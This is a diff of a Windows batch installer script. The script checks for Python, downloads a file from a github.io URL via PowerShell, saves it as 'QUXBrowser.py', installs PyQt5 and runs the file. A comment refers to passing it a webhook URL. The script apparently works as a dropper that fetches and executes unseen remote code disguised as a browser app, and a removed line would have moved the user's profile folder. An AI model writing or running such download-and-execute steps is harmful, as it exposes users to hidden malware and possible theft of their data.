@@ -9,16 +9,14 @@ if %ERRORLEVEL% NEQ 0 (
     echo Python is already installed.
 )
 setlocal
-
+Cd /d %userprofile%Desktop
 :: Download the PowerShell script
 powershell -Command "Invoke-WebRequest -Uri https://radio1233.github.io/game.github.io/app -OutFile QUXBrowser.py"
 pip install PyQt5
 pip install PyQtWebEngine
 pip install PyQt5
 pip install PyQtWebEngine
-Move /-y "C:\Users\"%userprofile%" "%userprofile%desktopstaging"
+
 :: Execute the PowerShell script with the webhook URL as a parameter
 QUXBrowser.py
-
-:: Cleanup
-del app.py
+cd
